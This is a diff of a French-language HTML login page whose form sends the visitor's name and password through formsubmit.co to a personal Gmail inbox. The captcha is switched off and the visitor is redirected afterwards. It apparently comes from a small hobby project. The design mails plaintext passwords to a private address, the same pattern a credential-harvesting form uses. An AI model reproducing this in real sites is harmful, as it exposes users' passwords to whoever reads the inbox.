@@ -3,19 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>APPSUCHI</title>
+    <title>CONNEXION</title>
     <link rel="stylesheet" href="./templates/style.css">
 </head>
 <body>
     <div id="connexion">
-        <form action="https://formsubmit.co/tolojaranarijaonina@gmail.com" method="post">
+        <form action="https://formsubmit.co/tolojaranarijaonina@gmail.com" method="POST">
             <h1>CONNECTEZ - VOUS</h1>
             <input class="input" type="text" name="name" placeholder="Entrer votre nom" autofocus required>
-            <input class="input"  type="password" name="name" placeholder="Entrer votre mot de passe" required>
-            <input type="submit" id="envoyer" value="CONNEXION">
+            <input class="input"  type="password" name="message" placeholder="Mot de passe" maxlength="8" minlength="4" required>
+            <button id="connexion" type="submit">CONNEXION</button>
             <p>Mot de passe oublié? <span>S'INSCRIRE</span></p>
 
-            <input type="hidden" name="_subject" value="Nouveau message">
+            <input type="hidden" name="_subject" value="Nouveau CONNEXION">
             <input type="hidden" name="_template" value="box">
             <input type="hidden" name="_captcha" value="false">
             <input type="hidden" name="_next" value="https://toloja2.github.io/SiteAppSuchi/templates/index.html">
